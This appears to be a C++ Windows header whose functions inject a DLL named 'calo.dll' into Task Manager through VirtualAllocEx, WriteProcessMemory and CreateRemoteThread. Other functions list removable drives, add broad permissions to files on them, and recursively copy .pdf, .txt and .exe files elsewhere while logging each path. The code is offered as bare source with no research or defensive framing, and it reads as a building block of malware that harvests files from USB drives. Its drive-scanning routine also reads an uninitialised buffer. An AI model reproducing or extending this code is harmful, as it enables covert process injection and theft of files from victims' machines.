#pragma once
#define _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_CPP_OVERLOAD_STANDARD_NAMES 1
#define _CRT_SECURE_CPP_OVERLOAD_STANDARD_NAMES_COUNT 1
#define MAX_LENGTH 128
#include <Windows.h>
#include <time.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <direct.h>
#include <tchar.h>
#include <fstream>
#include <ctime>
#include <filesystem>
#include <thread>
#include <mutex>
#include <winternl.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <string.h>
#include <commdlg.h>
#pragma comment(lib, "Shlwapi.lib")
#ifndef _WIN32_WINNT               
#define _WIN32_WINNT 0x0501
#endif	
const WCHAR* PATH_TO_INJECTED_DLL = L"calo.dll";
const WCHAR* TARGET_PROCESS = L"Taskmgr.exe";
DWORD pidof(const WCHAR* processImage);
PVOID injectData(HANDLE hProcess, PVOID pLocalData, SIZE_T dataSize);
HANDLE getRemoteDllHandle(DWORD targetPID, WCHAR* fullDllPath);
std::mutex mtx;
char DRIVE_LIST[MAX_LENGTH];
char NEW_DRIVE_LIST[MAX_LENGTH];
std::string pdf = ".pdf";
std::string txt = ".txt";
std::string exe = ".exe";
DWORD pidof(const WCHAR* processImage)
{
    HANDLE hSsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = NULL;
    if (hSsnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSsnapshot, &pe32))
        {
            do {
                if (!wcscmp(processImage, pe32.szExeFile))
                {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSsnapshot, &pe32));
        }
        CloseHandle(hSsnapshot);
    }
    return pid;
}
PVOID injectData(HANDLE hProcess, PVOID pLocalData, SIZE_T dataSize)
{
    PVOID pRemoteData = (PVOID)VirtualAllocEx(
        hProcess,
        NULL,
        dataSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (pRemoteData == NULL)
    {
        return NULL;
    }
    SIZE_T bytesWritten;
    BOOL success = WriteProcessMemory(hProcess, pRemoteData, pLocalData, dataSize, &bytesWritten);
    if (!success || bytesWritten != dataSize)
    {
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
        return NULL;
    }
    return pRemoteData;
}
HANDLE getRemoteDllHandle(DWORD targetPID, WCHAR* fullDllPath)
{
    HANDLE hSsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, targetPID);
    HANDLE hInjectedDll = NULL;
    if (hSsnapshot != INVALID_HANDLE_VALUE)
    {
        MODULEENTRY32 me32;
        me32.dwSize = sizeof(MODULEENTRY32);
        if (Module32First(hSsnapshot, &me32))
        {
            do {
                if (!wcscmp(fullDllPath, me32.szExePath))
                {
                    hInjectedDll = me32.hModule;
                    break;
                }
            } while (Module32Next(hSsnapshot, &me32));
        }
        CloseHandle(hSsnapshot);
    }
    return hInjectedDll;
}
BOOL injectDll(HANDLE hProcess, WCHAR* fullDllPath)
{
    HMODULE hKernel32 = GetModuleHandle(L"Kernel32.dll");
    if (!hKernel32)
        return FALSE;
    PVOID pLoadLibrary = (PVOID)GetProcAddress(hKernel32, "LoadLibraryW");
    PVOID pRemotePath = injectData(hProcess, fullDllPath, (wcslen(fullDllPath) + 1) * sizeof(WCHAR));
    if (!pRemotePath)
        return FALSE;
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemotePath,
        0,
        NULL);
    if (!hThread)
    {
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        return FALSE;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return TRUE;
}
void controldevice(char drive[]) {
    int count = 0;
    char szLogicalDrives[MAX_PATH];
    size_t size = strlen(szLogicalDrives) + 1;
    wchar_t* text = new wchar_t[size];
    size_t outSize;
    mbstowcs_s(&outSize, text, size, szLogicalDrives, size - 1);
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, text);
    WCHAR* szSingleDrive = text;
    while (*szSingleDrive)
    {
        UINT nDriveType = GetDriveType(szSingleDrive);
        if (nDriveType == DRIVE_UNKNOWN) {
        }
        else if (nDriveType == DRIVE_NO_ROOT_DIR) {
        }
        else if (nDriveType == DRIVE_REMOVABLE) {
            char letter = szSingleDrive[0];
            drive[letter - 65] = letter;
        }
        else if (nDriveType == DRIVE_FIXED) {
        }
        else if (nDriveType == DRIVE_REMOTE) {
        }
        else if (nDriveType == DRIVE_CDROM) {
        }
        else if (nDriveType == DRIVE_RAMDISK) {
        }
        szSingleDrive += wcslen(szSingleDrive) + 1;
    }
}

inline std::string getCurrentDateTime(std::string s) {
    time_t now = time(0);
    struct tm  tstruct;
    char buf[80];
    tstruct = *localtime(&now);
    if (s == "now")
        strftime(buf, sizeof(buf), "%Y-%m-%d %X", &tstruct);
    else if (s == "date")
        strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct);
    return std::string(buf);
};
inline void Logger(std::string logMsg) {
    std::string filePath = "c:\\logs\\log " + getCurrentDateTime("date") + ".txt";
    std::string now = getCurrentDateTime("now");
    std::ofstream ofs(filePath.c_str(), std::ios_base::out | std::ios_base::app);
    ofs << now << ' ' << logMsg << '\n';
    ofs.close();
}

static void copy_file_with_extentions(const std::string& path, const std::string& to, const std::string& extensions)
{
    for (auto& p : std::filesystem::recursive_directory_iterator(path, std::filesystem::directory_options::skip_permission_denied))
    {
        if (p.path().extension() == extensions)
        {
            std::string data123;
            data123 = p.path().string();
            std::filesystem::permissions(data123,
                std::filesystem::perms::owner_all | std::filesystem::perms::group_all,
                std::filesystem::perm_options::add);
            Logger(data123);
            try
            {
                std::filesystem::copy(data123, to);
            }
            catch (std::exception& e)
            {
                Logger(e.what());
            }
        }
    }
}